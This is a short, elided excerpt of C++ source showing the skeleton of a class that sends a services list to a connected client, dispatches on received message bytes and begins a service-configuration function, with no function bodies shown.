...
CSRMR::CSRMR(privatra*pClient) : Cprotm(pClient)
{
    SendServicesList();
}
...
void CSRMR::OnReceive(LPBYTE lpBuffer, UINT nSize)
{
	switch (lpBuffer[0])
	{
...
void CSRMR::ServiceConfig(LPBYTE lpBuffer, UINT nSize)
{
